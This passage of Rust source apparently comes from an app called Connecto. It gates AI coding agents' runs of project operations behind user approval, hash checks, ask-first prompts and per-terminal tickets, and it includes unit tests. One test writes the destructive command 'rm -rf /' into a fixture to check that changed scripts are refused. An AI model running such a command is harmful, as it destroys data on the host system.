        let workspace = self.workspace.get().ok_or("Connecto is starting.")?;
        if workspace.pause_switch().is_paused() {
            return Err("Resume Connecto first.".into());
        }
        let relay = workspace
            .relay(project_id)
            .ok_or("Open the project first.")?;
        let control = relay.terminals();
        let name: String = name.chars().take(connecto_core::MAX_NAME_CHARS).collect();
        let id = control.add_with(ToolKind::Shell, Some(name), None, None, None)?;
        workspace.activate(project_id);
        workspace.set_active_terminal(project_id, &id);
        Ok((id, control))
    }

    /// Type `line` into terminal `id` once its shell is ready. Blocks up to
    /// [`SHELL_READY`].
    fn type_line(
        control: &dyn connecto_core::TerminalsControl,
        id: &str,
        line: &str,
    ) -> Result<(), String> {
        Self::wait_ready(control, id, SHELL_READY)?;
        let view = control.view();
        let entry = view
            .terminals
            .iter()
            .find(|e| e.id == id)
            .ok_or_else(|| format!("{id} was closed before the operation started."))?;
        entry
            .session
            .send_input(format!("{line}\r").into_bytes())
            .map_err(|_| format!("Could not type into {id}."))
    }

    /// Wait until terminal `id`'s shell has started and read its startup
    /// files. Blocks up to `limit`.
    fn wait_ready(
        control: &dyn connecto_core::TerminalsControl,
        id: &str,
        limit: Duration,
    ) -> Result<(), String> {
        let started = Instant::now();
        let mut ready: Option<Instant> = None;
        while started.elapsed() < limit {
            let view = control.view();
            let Some(entry) = view.terminals.iter().find(|e| e.id == id) else {
                return Err(format!("{id} was closed before the operation started."));
            };
            let stage = entry.control.as_ref().map(|c| c.stage());
            if let Some(connecto_core::PaneStage::Failed { reason }) = &stage {
                return Err(format!("{id} did not start: {reason}"));
            }
            let running = matches!(entry.session.status(), SessionStatus::Running)
                && stage == Some(connecto_core::PaneStage::Running);
            // Half a second after the shell started: it reads a line once
            // its startup files have run.
            if running
                && ready.get_or_insert_with(Instant::now).elapsed() > Duration::from_millis(500)
            {
                return Ok(());
            }
            std::thread::sleep(Duration::from_millis(150));
        }
        Err(format!("{id} did not start in time."))
    }

    /// [`Self::type_line`] from a thread; what fails is said in the
    /// Operations dialog.
    fn type_when_ready(
        &self,
        project_id: &str,
        control: Arc<dyn connecto_core::TerminalsControl>,
        id: &str,
        line: String,
    ) {
        let host = self.me.get().cloned().unwrap_or_default();
        let project = project_id.to_owned();
        let typed_id = id.to_owned();
        let spawned = std::thread::Builder::new()
            .name("ops-shell".into())
            .spawn(move || {
                if let Err(why) = Self::type_line(&*control, &typed_id, &line)
                    && let Some(host) = host.upgrade()
                {
                    host.notice(&project, why, true);
                }
            });
        if spawned.is_err() {
            self.notice(
                project_id,
                format!("Could not start {id}'s operation."),
                true,
            );
        }
    }

    // ---- the bridge ----------------------------------------------------

    fn list_text(&self, caller: &OpsCaller) -> String {
        let state = self.state(&caller.project_id);
        let found = folder::scan(&caller.folder);
        let rows = connecto_ops::rows(&found, &state, &[], &[]);
        let approved: Vec<_> = rows.iter().filter(|r| r.standing.runs()).collect();
        let waiting = rows.len() - approved.len();
        let mut out = String::new();
        if approved.is_empty() {
            out.push_str("This project has no approved operations.\n");
        } else {
            out.push_str(
                "Operations of this project (run one with `connecto op run <name> [args]`):\n",
            );
            for row in &approved {
                let args: String = row
                    .args
                    .iter()
                    .map(|a| {
                        if a.required {
                            format!(" <{}>", a.name)
                        } else {
                            format!(" [{}]", a.name)
                        }
                    })
                    .collect();
                let kind = row.kind.map_or("", OpKind::word);
                let asks = if row.asks_first {
                    ", asks the user first"
                } else {
                    ""
                };
                out.push_str(&format!(
                    "- {}{args}: {} ({kind}{asks})\n",
                    row.slug, row.description
                ));
            }
        }
        if waiting > 0 {
            out.push_str(&format!(
                "{waiting} more wait for the user's approval in Connecto and do not run yet.\n"
            ));
        }
        out
    }

    fn show_text(&self, caller: &OpsCaller, slug: &str) -> OpsAnswer {
        let loaded = match folder::load(&caller.folder, slug) {
            Ok(l) => l,
            Err(why) => return refused("not_found", &why),
        };
        let state = self.state(&caller.project_id);
        let standing = match state.approved.get(slug) {
            Some(h) if *h == loaded.hash => "approved",
            Some(_) => "changed since the user approved it (does not run)",
            None => "not approved yet (does not run)",
        };
        let s = &loaded.spec;
        let mut out = format!(
            "{} ({slug})\n{}\nKind: {}. Danger: {}. {}. Status: {standing}. Timeout: {} s.\n",
            s.name,
            s.description,
            s.kind.word(),
            s.danger.word(),
            if s.asks_first() {
                "Asks the user first"
            } else {
                "Runs without asking"
            },
            s.timeout_s
        );
        if !s.args.is_empty() {
            out.push_str("Arguments:\n");
            for a in &s.args {
                out.push_str(&format!(
                    "  {}{}: {}\n",
                    a.name,
                    if a.required { "" } else { " (optional)" },
                    a.description
                ));
            }
        }
        out.push_str(&format!("Asked for as: {}\n", s.phrases.join("; ")));
        out.push_str(&format!(
            "--- .connecto/ops/{slug}/{} ---\n{}",
            s.body_file(),
            loaded.body
        ));
        OpsAnswer::Text(out)
    }

    /// Take the launch a ticket names, for this caller and operation only.
    fn claim(&self, caller: &OpsCaller, slug: &str, ticket: &str) -> Option<Launch> {
        let now = now_ms();
        let mut all = lock(&self.launches);
        let ok = all.get(ticket).is_some_and(|l| {
            l.project_id == caller.project_id
                && l.slug == slug
                && l.expires_ms > now
                && l.terminal.as_deref() == Some(caller.terminal.as_str())
        });
        if ok { all.remove(ticket) } else { None }
    }

    fn run(&self, caller: &OpsCaller, args: &[String]) -> OpsAnswer {
        let mut yes = false;
        let mut ticket = None;
        let mut rest: Vec<String> = Vec::new();
        let mut words = args.iter();
        while let Some(word) = words.next() {
            match word.as_str() {
                "--yes" => yes = true,
                "--ticket" => ticket = words.next().cloned(),
                _ => rest.push(word.clone()),
            }
        }
        let Some((slug, given)) = rest.split_first() else {
            return refused("bad_request", "`op run` needs an operation name.");
        };
        let loaded = match folder::load(&caller.folder, slug) {
            Ok(l) => l,
            Err(why) => {
                return refused(
                    "not_found",
                    &format!("{why}. `connecto op list` lists them."),
                );
            }
        };
        let state = self.state(&caller.project_id);
        match state.approved.get(slug.as_str()) {
            Some(h) if *h == loaded.hash => {}
            Some(_) => {
                return refused(
                    "not_approved",
                    &format!(
                        "Operation `{slug}` changed since the user approved it, so it does not run. The user approves it again in Connecto (the project's Operations icon)."
                    ),
                );
            }
            None => {
                return refused(
                    "not_approved",
                    &format!(
                        "Operation `{slug}` is not approved, so it does not run. The user approves it in Connecto (the project's Operations icon)."
                    ),
                );
            }
        }
        let s = &loaded.spec;
        // A launch Connecto prepared: the person chose it (or allowed it to
        // run in place of a prompt) for exactly these files and arguments.
        let (from, op_args): (RunFrom, Vec<String>) = if let Some(ticket) = ticket {
            let Some(launch) = self.claim(caller, slug, &ticket) else {
                return refused(
                    "not_found",
                    "That run is not prepared for this terminal any more. Run it again from Connecto.",
                );
            };
            if !given.is_empty() {
                return refused("bad_request", "A prepared run takes no other arguments.");
            }
            if launch.hash != loaded.hash {
                return refused(
                    "changed",
                    &format!("`{slug}` changed since it was chosen, so it was not run."),
                );
            }
            if launch.from == RunFrom::Intercept && !Self::may_intercept(&state, slug, &loaded) {
                return refused(
                    "changed",
                    &format!("`{slug}` may no longer run in place of a prompt, so it was not run."),
                );
            }
            (launch.from, launch.args)
        } else {
            if s.asks_first() && !yes {
                return refused(
                    "asks_first",
                    &format!(
                        "Operation `{slug}` asks the user first ({}). Ask the user; once they agree, run `connecto op run {slug}{} --yes`.",
                        s.danger.label().to_lowercase(),
                        given.iter().map(|a| format!(" {a}")).collect::<String>()
                    ),
                );
            }
            let from = if caller.tool == ToolKind::Shell {
                RunFrom::Shell
            } else {
                RunFrom::Agent
            };
            (from, given.to_vec())
        };
        let required = s.args.iter().filter(|a| a.required).count();
        if op_args.len() < required || op_args.len() > s.args.len() {
            let names: Vec<&str> = s.args.iter().map(|a| a.name.as_str()).collect();
            return refused(
                "bad_request",
                &format!(
                    "`{slug}` takes {} to {} arguments ({}).",
                    required,
                    s.args.len(),
                    if names.is_empty() {
                        "none".to_owned()
                    } else {
                        names.join(", ")
                    }
                ),
            );
        }
        let run = self.new_run_id();
        let started_ms = now_ms();
        if s.kind == OpKind::Recipe {
            let _ = self.record_run(
                &caller.project_id,
                &RunRecord {
                    run,
                    slug: slug.clone(),
                    from,
                    started_ms,
                    duration_ms: 0,
                    outcome: "exit 0".into(),
                    timeout_s: s.timeout_s,
                },
            );
            let mut text = format!("Operation `{slug}` is a recipe: follow these steps.\n");
            if !op_args.is_empty() {
                text.push_str("\nThe arguments given:\n");
                for (arg, value) in s.args.iter().zip(&op_args) {
                    text.push_str(&format!("- {}: {value}\n", arg.name));
                }
            }
            text.push('\n');
            text.push_str(&loaded.body);
            return OpsAnswer::Text(text);
        }
        if cfg!(not(unix)) {
            return refused(
                "not_available",
                "Operation scripts need /bin/bash, which this system does not have.",
            );
        }
        // Recorded before it is handed out: a run that never reports, or
        // outlives this app, still shows (as not finished).
        let started = RunRecord {
            run: run.clone(),
            slug: slug.clone(),
            from,
            started_ms,
            duration_ms: 0,
            outcome: connecto_ops::state::RUNNING.into(),
            timeout_s: s.timeout_s,
        };
        if let Err(err) = self.record_run(&caller.project_id, &started) {
            return refused(
                "not_recorded",
                &format!("The run could not be recorded: {err}"),
            );
        }
        lock(&self.pending).insert(
            run.clone(),
            Pending {
                project_id: caller.project_id.clone(),
                terminal: caller.terminal.clone(),
                slug: slug.clone(),
                from,
                started_ms,
                timeout_s: s.timeout_s,
            },
        );
        let mut argv = vec!["-c".to_owned(), loaded.body.clone(), slug.clone()];
        argv.extend(op_args);
        OpsAnswer::Exec(OpsExec {
            run: run.clone(),
            program: "/bin/bash".into(),
            args: argv,
            cwd: caller.folder.clone(),
            env: vec![
                ("CONNECTO_OP".into(), slug.clone()),
                ("CONNECTO_OP_RUN".into(), run),
                (
                    "CONNECTO_PROJECT".into(),
                    caller.folder.to_string_lossy().into_owned(),
                ),
            ],
            timeout_s: s.timeout_s,
        })
    }

    fn done(&self, caller: &OpsCaller, args: &[String]) -> OpsAnswer {
        let [run, outcome, ms] = args else {
            return refused("bad_request", "`op done` is for the connecto command.");
        };
        // Only the terminal that ran it reports its end.
        let pending = lock(&self.pending)
            .get(run)
            .filter(|p| p.project_id == caller.project_id && p.terminal == caller.terminal)
            .cloned();
        let Some(pending) = pending else {
            return refused("not_found", "No such run.");
        };
        let mut outcome: String = outcome.chars().take(80).collect();
        if outcome == connecto_ops::state::RUNNING {
            outcome = "lost".into();
        }
        match self.record_run(
            &pending.project_id,
            &RunRecord {
                run: run.clone(),
                slug: pending.slug,
                from: pending.from,
                started_ms: pending.started_ms,
                duration_ms: ms.parse().unwrap_or(0),
                outcome,
                timeout_s: pending.timeout_s,
            },
        ) {
            Ok(()) => {
                // Forgotten only once its end is written.
                lock(&self.pending).remove(run);
                OpsAnswer::Text(String::new())
            }
            Err(err) => refused(
                "not_recorded",
                &format!("The run could not be recorded: {err}"),
            ),
        }
    }

    fn llm(&self, caller: &OpsCaller, args: &[String], text: Option<&str>) -> OpsAnswer {
        let model = match args {
            [] => "haiku",
            [flag, model] if flag == "--model" && LLM_MODELS.contains(&model.as_str()) => {
                model.as_str()
            }
            _ => return refused("bad_request", "`op llm` takes only `--model haiku|sonnet`."),
        };
        let Some(prompt) = text.filter(|t| !t.trim().is_empty()) else {
            return refused("bad_request", "`op llm` takes its prompt on stdin.");
        };
        if prompt.len() > connecto_core::ops::LLM_PROMPT_MAX {
            return refused(
                "bad_request",
                "The prompt is over 32 KiB: it is refused, not cut.",
            );
        }
        let job = UtilityJob {
            project_id: caller.project_id.clone(),
            project: caller.folder.clone(),
            choice: ModelChoice::new(Provider::Claude, model, "low"),
            prompt: prompt.to_owned(),
            purpose: UtilityPurpose::Operation,
            label: "operation".into(),
        };
        let cancel = AtomicBool::new(false);
        match self.runner.run(&job, Instant::now() + LLM_LIMIT, &cancel) {
            Ok(reply) => OpsAnswer::Text(reply.text),
            Err(err) => refused("llm_failed", &format!("The model gave no answer: {err}")),
        }
    }
}

/// The `[connecto]` line for a prompt that matches `slug`: Connecto's own
/// words and the checked slug, never text from the operation's files.
fn suggestion(slug: &str) -> String {
    format!(
        "[connecto] This request may match the project operation `{slug}`. Check it with `connecto op show {slug}`; if it fits, run `connecto op run {slug}` instead of doing the steps yourself."
    )
}

fn refused(code: &str, reason: &str) -> OpsAnswer {
    OpsAnswer::Refused {
        code: code.to_owned(),
        reason: reason.to_owned(),
    }
}

impl OpsBridge for OpsHost {
    fn command(
        &self,
        caller: &OpsCaller,
        verb: &str,
        args: &[String],
        text: Option<&str>,
    ) -> OpsAnswer {
        if !Self::safe_id(&caller.project_id) {
            return refused("no_project", "This terminal has no project.");
        }
        match verb {
            "list" => OpsAnswer::Text(self.list_text(caller)),
            "show" => match args {
                [slug] => self.show_text(caller, slug),
                _ => refused("bad_request", "`op show` takes one operation name."),
            },
            "run" => self.run(caller, args),
            "done" => self.done(caller, args),
            "intercept" => self.confirm_intercept(caller, args),
            "go" => self.go(caller, args),
            "llm" => self.llm(caller, args, text),
            other => refused(
                "bad_request",
                &format!("unknown op command {other:?}: use list, show, run or llm"),
            ),
        }
    }

    fn has_ops(&self, project_id: &str, folder: &Path) -> bool {
        if !Self::safe_id(project_id) {
            return false;
        }
        let state = self.state(project_id);
        folder::scan(folder)
            .iter()
            .any(|f| matches!(connecto_ops::standing(f, &state), OpStanding::Approved))
    }

    fn on_prompt(&self, caller: &OpsCaller, prompt: &str) -> PromptAdvice {
        if !Self::safe_id(&caller.project_id) || !connecto_ops::state::is_persons_prompt(prompt) {
            return PromptAdvice::Nothing;
        }
        self.expire_holds();
        let at_ms = now_ms();
        let state = self.state(&caller.project_id);
        let (outcome, hash) = if state.hook == HookMode::Off {
            (connecto_ops::PromptOutcome::None, None)
        } else {
            self.match_prompt(caller, &state, prompt)
        };
        // A hook that cannot take an intercept gets a suggestion.
        let outcome = match outcome {
            connecto_ops::PromptOutcome::Intercepted(slug) if !caller.holds => {
                connecto_ops::PromptOutcome::Suggested(slug)
            }
            other => other,
        };
        match outcome {
            connecto_ops::PromptOutcome::Intercepted(slug) => {
                // Recorded when the hook confirms, or when the hold expires.
                let ticket = self.new_ticket();
                lock(&self.holds).insert(
                    ticket.clone(),
                    Hold {
                        project_id: caller.project_id.clone(),
                        terminal: caller.terminal.clone(),
                        slug: slug.clone(),
                        hash: hash.unwrap_or_default(),
                        prompt: prompt.to_owned(),
                        at_ms,
                    },
                );
                PromptAdvice::Intercept {
                    reason: format!(
                        "Connecto is running the project operation `{slug}` for this prompt, in a new shell terminal of the project (op {slug}). The agent did not see the prompt."
                    ),
                    ticket,
                }
            }
            connecto_ops::PromptOutcome::Suggested(slug) => {
                let line = suggestion(&slug);
                self.record_prompt(
                    &caller.project_id,
                    &caller.terminal,
                    prompt,
                    at_ms,
                    connecto_ops::PromptOutcome::Suggested(slug),
                );
                PromptAdvice::Suggest(line)
            }
            connecto_ops::PromptOutcome::None => {
                self.record_prompt(
                    &caller.project_id,
                    &caller.terminal,
                    prompt,
                    at_ms,
                    connecto_ops::PromptOutcome::None,
                );
                PromptAdvice::Nothing
            }
        }
    }
}

/// The UI's handle: actions run on a thread of their own, never the UI's.
pub struct OpsUi(pub Arc<OpsHost>);

impl OpsControl for OpsUi {
    /// The cached view. A stale one is returned as it is while a worker
    /// rebuilds it: the folder scan, hashes and logs never run on the
    /// window's thread, except the first time a project is shown.
    fn view(&self, project: &str) -> OpsView {
        let cached = lock(&self.0.views).get(project).cloned();
        match cached {
            Some((at, view)) if at.elapsed() < VIEW_FRESH => view,
            Some((_, view)) => {
                if lock(&self.0.refreshing).insert(project.to_owned()) {
                    let host = Arc::clone(&self.0);
                    let name = project.to_owned();
                    let spawned =
                        std::thread::Builder::new()
                            .name("ops-view".into())
                            .spawn(move || {
                                let fresh = host.build_view(&name);
                                lock(&host.views).insert(name.clone(), (Instant::now(), fresh));
                                lock(&host.refreshing).remove(&name);
                            });
                    if spawned.is_err() {
                        lock(&self.0.refreshing).remove(project);
                    }
                }
                view
            }
            None => {
                let view = self.0.build_view(project);
                lock(&self.0.views).insert(project.to_owned(), (Instant::now(), view.clone()));
                view
            }
        }
    }

    fn submit(&self, project: String, action: OpsAction) {
        let ui = Self(Arc::clone(&self.0));
        let _ = std::thread::Builder::new()
            .name("ops-action".into())
            .spawn(move || ui.act(&project, action));
    }

    /// A peer's action arrives here, on the connection's thread: done as
    /// the window's own, and said the same way.
    fn act(&self, project: &str, action: OpsAction) -> Result<String, String> {
        let result = self.0.act(project, action);
        match &result {
            Ok(text) => self.0.notice(project, text.clone(), false),
            Err(text) => self.0.notice(project, text.clone(), true),
        }
        result
    }
}

/// Open an agent on each CLI `allowed` names, in order, until one opens:
/// its id, or the last refusal. Never a CLI the project leaves out.
fn first_that_opens(
    allowed: connecto_core::ProjectTools,
    mut open: impl FnMut(ToolKind) -> Result<String, String>,
) -> Result<String, String> {
    let mut last = Err("This project allows no agent.".to_owned());
    for tool in allowed.tools() {
        last = open(tool);
        if last.is_ok() {
            break;
        }
    }
    last
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::panic)]
mod tests {

    /// A task of Connecto's (a recipe, discovery, a fix) opens on the first
    /// CLI the project allows, never on one it leaves out: Claude when it is
    /// allowed, else the next that opens.
    #[test]
    fn a_task_agent_opens_on_the_first_cli_the_project_allows() {
        use connecto_core::ProjectTools;
        let tried = std::cell::RefCell::new(Vec::new());
        let open = |fails: &'static [ToolKind]| {
            let tried = &tried;
            move |tool: ToolKind| {
                tried.borrow_mut().push(tool);
                if fails.contains(&tool) {
                    Err(format!("{} failed", tool.name()))
                } else {
                    Ok(format!("{}-1", tool.name()))
                }
            }
        };
        assert_eq!(
            first_that_opens(ProjectTools::All, open(&[])),
            Ok("claude-1".into())
        );
        tried.borrow_mut().clear();
        let codex_pi = ProjectTools::from_tools([ToolKind::Codex, ToolKind::Pi]).unwrap();
        assert_eq!(first_that_opens(codex_pi, open(&[])), Ok("codex-1".into()));
        assert_eq!(*tried.borrow(), [ToolKind::Codex], "never Claude");
        tried.borrow_mut().clear();
        assert_eq!(
            first_that_opens(codex_pi, open(&[ToolKind::Codex])),
            Ok("pi-1".into())
        );
        assert_eq!(
            first_that_opens(ProjectTools::OpenCode, open(&[ToolKind::OpenCode])),
            Err("opencode failed".into())
        );
    }
    use super::*;

    fn host(dir: &Path) -> Arc<OpsHost> {
        let layout = Layout {
            data_root: dir.join("data"),
            home: dir.join("home"),
        };
        Arc::new(OpsHost {
            data_root: dir.join("data"),
            workspace: OnceLock::new(),
            runner: UtilityRunner::new(layout, Arc::new(|| {})),
            writing: Mutex::new(()),
            views: Mutex::new(HashMap::new()),
            refreshing: Mutex::new(std::collections::HashSet::new()),
            notices: Mutex::new(HashMap::new()),
            pending: Mutex::new(HashMap::new()),
            launches: Mutex::new(HashMap::new()),
            holds: Mutex::new(HashMap::new()),
            armed: Mutex::new(HashMap::new()),
            next_run: AtomicU64::new(1),
            jev_key: Arc::new(connecto_automation::MemoryKeys::default()),
            asker: Arc::new(NoJev),
            jev_wait: Duration::from_millis(200),
            me: OnceLock::new(),
        })
    }

    /// Jev that never answers usefully.
    struct NoJev;

    impl connecto_automation::Asker for NoJev {
        fn ask(
            &self,
            _: &str,
            _: &str,
            _: &str,
            _: &[(String, serde_json::Value)],
        ) -> connecto_automation::jev::Exchange {
            connecto_automation::jev::Exchange {
                result: Err(connecto_automation::jev::JevError::Network("off".into())),
                request: String::new(),
                response: String::new(),
            }
        }
    }

    /// Jev that picks one choice.
    struct Picks(&'static str, f64);

    impl connecto_automation::Asker for Picks {
        fn ask(
            &self,
            _: &str,
            _: &str,
            _: &str,
            _: &[(String, serde_json::Value)],
        ) -> connecto_automation::jev::Exchange {
            connecto_automation::jev::Exchange {
                result: Ok(connecto_automation::jev::Response {
                    answers: vec![(
                        "operation".into(),
                        connecto_automation::jev::Answer::Choice {
                            choice: self.0.into(),
                            confidence: self.1,
                        },
                    )],
                    usage: connecto_automation::jev::Usage::default(),
                }),
                request: String::new(),
                response: String::new(),
            }
        }
    }

    fn with_jev(dir: &Path, asker: Arc<dyn connecto_automation::Asker>) -> Arc<OpsHost> {
        let base = host(dir);
        let layout = Layout {
            data_root: dir.join("data"),
            home: dir.join("home"),
        };
        Arc::new(OpsHost {
            data_root: dir.join("data"),
            workspace: OnceLock::new(),
            runner: UtilityRunner::new(layout, Arc::new(|| {})),
            writing: Mutex::new(()),
            views: Mutex::new(HashMap::new()),
            refreshing: Mutex::new(std::collections::HashSet::new()),
            notices: Mutex::new(HashMap::new()),
            pending: Mutex::new(HashMap::new()),
            launches: Mutex::new(HashMap::new()),
            holds: Mutex::new(HashMap::new()),
            armed: Mutex::new(HashMap::new()),
            next_run: AtomicU64::new(1),
            jev_key: Arc::new(connecto_automation::MemoryKeys::with("k")),
            asker,
            jev_wait: base.jev_wait,
            me: OnceLock::new(),
        })
    }

    #[test]
    fn jev_confirms_or_refuses_and_intercept_needs_every_condition() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "tests", SPEC, "cargo test\n");
        let claude = caller(&project, ToolKind::Claude);
        // Jev says none: nothing, even for an exact phrase.
        let host = with_jev(dir.path(), Arc::new(Picks("none", 0.99)));
        approve(&host, &project, "tests");
        assert_eq!(
            host.on_prompt(&claude, "run the tests"),
            PromptAdvice::Nothing
        );
        // Jev picks it: suggested. Intercept is off, so only suggested.
        let host = with_jev(dir.path(), Arc::new(Picks("op_1", 0.95)));
        assert!(matches!(
            host.on_prompt(&claude, "run the tests"),
            PromptAdvice::Suggest(_)
        ));
        // Low confidence: nothing.
        let host = with_jev(dir.path(), Arc::new(Picks("op_1", 0.4)));
        assert_eq!(
            host.on_prompt(&claude, "run the tests"),
            PromptAdvice::Nothing
        );
        // Intercept on: the prompt is held, nothing runs yet.
        let host = with_jev(dir.path(), Arc::new(Picks("op_1", 0.95)));
        host.update("00000000000000ab", |s| {
            s.intercept.insert("tests".into());
            Ok(())
        })
        .unwrap();
        let PromptAdvice::Intercept { reason, ticket } = host.on_prompt(&claude, "run the tests")
        else {
            panic!("not held");
        };
        assert!(reason.contains("`tests`"));
        // Another terminal cannot confirm it.
        let mut other = caller(&project, ToolKind::Claude);
        other.terminal = "claude-9".into();
        assert!(matches!(
            host.command(&other, "intercept", std::slice::from_ref(&ticket), None),
            OpsAnswer::Refused { .. }
        ));
        // An older hook cannot take one: it gets a suggestion.
        let mut old_hook = claude.clone();
        old_hook.holds = false;
        assert!(matches!(
            host.on_prompt(&old_hook, "run the tests"),
            PromptAdvice::Suggest(_)
        ));
        // Go before a prepared shell: nothing to go.
        assert!(matches!(
            host.command(&claude, "go", std::slice::from_ref(&ticket), None),
            OpsAnswer::Refused { ref code, .. } if code == "not_found"
        ));
        // Its terminal can confirm, but with no workspace the shell cannot
        // open: refused, so the hook prints nothing and the prompt goes on.
        assert!(matches!(
            host.command(&claude, "intercept", std::slice::from_ref(&ticket), None),
            OpsAnswer::Refused { ref code, .. } if code == "not_started"
        ));
        // A hold is confirmed once.
        assert!(matches!(
            host.command(&claude, "intercept", &[ticket], None),
            OpsAnswer::Refused { ref code, .. } if code == "not_found"
        ));
        // Switched off before the confirmation: refused.
        let PromptAdvice::Intercept { ticket, .. } = host.on_prompt(&claude, "run the tests")
        else {
            panic!("not held");
        };
        host.update("00000000000000ab", |s| {
            s.intercept.clear();
            Ok(())
        })
        .unwrap();
        assert!(matches!(
            host.command(&claude, "intercept", &[ticket], None),
            OpsAnswer::Refused { ref code, .. } if code == "changed"
        ));
        host.update("00000000000000ab", |s| {
            s.intercept.insert("tests".into());
            Ok(())
        })
        .unwrap();
        // Codex is never intercepted; a long prompt neither.
        let codex = caller(&project, ToolKind::Codex);
        assert!(matches!(
            host.on_prompt(&codex, "run the tests"),
            PromptAdvice::Suggest(_)
        ));
        let long = "run the tests and then also look at why the login page is slow today please";
        assert!(matches!(
            host.on_prompt(&claude, long),
            PromptAdvice::Suggest(_) | PromptAdvice::Nothing
        ));
        // Jev set up but unreachable: no advice at all.
        let host = with_jev(dir.path(), Arc::new(NoJev));
        assert_eq!(
            host.on_prompt(&claude, "run the tests"),
            PromptAdvice::Nothing
        );
    }

    const SPEC: &str = r#"{"version":1,"name":"Tests","description":"Runs the tests.","phrases":["run the tests"],"kind":"script","danger":"none","args":[{"name":"filter"}]}"#;
    const DEPLOY: &str = r#"{"version":1,"name":"Deploy","description":"Deploys.","phrases":["deploy"],"kind":"script","danger":"deploys"}"#;

    fn write(project: &Path, slug: &str, spec: &str, body: &str) {
        let dir = folder::ops_dir(project).join(slug);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("op.json"), spec).unwrap();
        std::fs::write(dir.join("run.sh"), body).unwrap();
    }

    fn caller(project: &Path, tool: ToolKind) -> OpsCaller {
        OpsCaller {
            terminal: "claude-1".into(),
            tool,
            project_id: "00000000000000ab".into(),
            folder: project.to_path_buf(),
            holds: true,
        }
    }

    fn approve(host: &OpsHost, project: &Path, slug: &str) {
        let store = host.store("00000000000000ab");
        let mut state = store.load(1);
        state
            .approved
            .insert(slug.into(), folder::load(project, slug).unwrap().hash);
        store.save(&state).unwrap();
    }

    #[test]
    fn only_approved_unchanged_operations_run() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "tests", SPEC, "cargo test \"$@\"\n");
        let host = host(dir.path());
        let agent = caller(&project, ToolKind::Claude);
        let answer = host.command(&agent, "run", &["tests".into()], None);
        assert!(matches!(answer, OpsAnswer::Refused { ref code, .. } if code == "not_approved"));
        approve(&host, &project, "tests");
        let OpsAnswer::Exec(exec) =
            host.command(&agent, "run", &["tests".into(), "x".into()], None)
        else {
            panic!("no exec");
        };
        assert_eq!(exec.program, "/bin/bash");
        assert_eq!(exec.args, ["-c", "cargo test \"$@\"\n", "tests", "x"]);
        assert_eq!(exec.cwd, project);
        // Too many arguments.
        let answer = host.command(
            &agent,
            "run",
            &["tests".into(), "a".into(), "b".into()],
            None,
        );
        assert!(matches!(answer, OpsAnswer::Refused { ref code, .. } if code == "bad_request"));
        // Changed after approval.
        write(&project, "tests", SPEC, "rm -rf /\n");
        let answer = host.command(&agent, "run", &["tests".into()], None);
        assert!(
            matches!(answer, OpsAnswer::Refused { ref reason, .. } if reason.contains("changed"))
        );
    }

    #[test]
    fn deploys_ask_first_and_runs_are_recorded() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "deploy", DEPLOY, "echo deploy\n");
        let host = host(dir.path());
        approve(&host, &project, "deploy");
        let agent = caller(&project, ToolKind::Claude);
        let answer = host.command(&agent, "run", &["deploy".into()], None);
        let OpsAnswer::Refused { code, reason } = answer else {
            panic!("ran without asking");
        };
        assert_eq!(code, "asks_first");
        assert!(reason.contains("--yes"));
        // Once the user agreed. `--from` is no option any more: an agent
        // cannot pass for the dialog.
        let pretend = [
            "deploy".to_owned(),
            "--from".to_owned(),
            "dialog".to_owned(),
        ];
        assert!(matches!(
            host.command(&agent, "run", &pretend, None),
            OpsAnswer::Refused { .. }
        ));
        let OpsAnswer::Exec(exec) =
            host.command(&agent, "run", &["deploy".into(), "--yes".into()], None)
        else {
            panic!("no exec");
        };
        let done = host.command(
            &agent,
            "done",
            &[exec.run.clone(), "exit 0".into(), "1200".into()],
            None,
        );
        assert_eq!(done, OpsAnswer::Text(String::new()));
        let runs = host.store("00000000000000ab").runs(now_ms());
        assert_eq!(runs.len(), 1);
        assert_eq!(runs[0].from, RunFrom::Agent);
        assert_eq!(runs[0].duration_ms, 1200);
        // A run reports once.
        let again = host.command(
            &agent,
            "done",
            &[exec.run, "exit 0".into(), "1".into()],
            None,
        );
        assert!(matches!(again, OpsAnswer::Refused { .. }));
        // The dialog's run: a ticket for that terminal, those files and
        // arguments; no --yes needed, and claimed once.
        let shell = caller(&project, ToolKind::Shell);
        let ticket = host.reserve(Launch {
            project_id: "00000000000000ab".into(),
            slug: "deploy".into(),
            hash: folder::load(&project, "deploy").unwrap().hash,
            args: Vec::new(),
            from: RunFrom::Dialog,
            terminal: Some(shell.terminal.clone()),
            expires_ms: now_ms() + 60_000,
        });
        let claim = ["deploy".to_owned(), "--ticket".to_owned(), ticket];
        let OpsAnswer::Exec(exec) = host.command(&shell, "run", &claim, None) else {
            panic!("no exec");
        };
        assert!(matches!(
            host.command(&shell, "run", &claim, None),
            OpsAnswer::Refused { .. }
        ));
        host.command(
            &shell,
            "done",
            &[exec.run, "exit 3".into(), "5".into()],
            None,
        );
        let runs = host.store("00000000000000ab").runs(now_ms());
        assert_eq!(runs[1].from, RunFrom::Dialog);
        assert!(!runs[1].ok());
        // A ticket for files that changed since is refused.
        let ticket = host.reserve(Launch {
            project_id: "00000000000000ab".into(),
            slug: "deploy".into(),
            hash: "old".into(),
            args: Vec::new(),
            from: RunFrom::Dialog,
            terminal: Some(shell.terminal.clone()),
            expires_ms: now_ms() + 60_000,
        });
        assert!(matches!(
            host.command(&shell, "run", &["deploy".into(), "--ticket".into(), ticket], None),
            OpsAnswer::Refused { ref code, .. } if code == "changed"
        ));
    }

    #[test]
    fn list_and_show_say_what_runs() {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("p");
        write(&project, "tests", SPEC, "cargo test\n");
        write(&project, "deploy", DEPLOY, "echo deploy\n");
        let host = host(dir.path());
        approve(&host, &project, "deploy");
        let agent = caller(&project, ToolKind::Codex);
        let OpsAnswer::Text(list) = host.command(&agent, "list", &[], None) else {
            panic!("no list");
        };
        assert!(
            list.contains("- deploy: Deploys. (script, asks the user first)"),
            "{list}"
        );
        assert!(list.contains("1 more wait"), "{list}");
        let OpsAnswer::Text(show) = host.command(&agent, "show", &["tests".into()], None) else {
            panic!("no show");
        };
        assert!(show.contains("not approved yet"), "{show}");
        assert!(show.contains("cargo test"), "{show}");
